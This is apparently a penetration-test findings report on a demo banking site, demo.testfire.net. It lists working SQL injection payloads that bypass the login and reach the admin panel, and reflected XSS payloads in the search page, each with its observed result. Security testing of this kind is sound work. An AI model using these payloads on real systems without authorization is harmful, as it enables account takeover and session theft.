## Vulnerability Findings

### 🔴 CRITICAL — SQL Injection → Authentication Bypass

**URL:** `POST http://demo.testfire.net/doLogin`
**Parameter:** `uid`

**Payload 1 (Admin bypass):**
```
uid=admin'--&passw=anything&btnSubmit=Login
```
**Result:** Logged in as `Admin User` with full admin panel access (`/admin/admin.jsp` — Edit Users)

**Payload 2 (OR 1=1 bypass):**
```
uid=' OR '1'='1'--&passw=anything&btnSubmit=Login
```
**Result:** Authentication completely bypassed

**Impact:** Complete authentication bypass, admin account takeover, access to all user accounts and banking data.

---

### 🔴 HIGH — Reflected XSS in Search

**URL:** `GET http://demo.testfire.net/search.jsp?query=<PAYLOAD>`

**Payload 1:**
```
/search.jsp?query=<script>alert(1)</script>
```
**Result:** `<script>alert(1)</script>` reflected unsanitized in response ✓

**Payload 2 (SVG):**
```
/search.jsp?query=<svg onload=alert(1)>
```
**Result:** `<svg onload=alert(1)>` reflected in response ✓

**Impact:** Session hijacking, credential theft, malicious redirects against authenticated users.
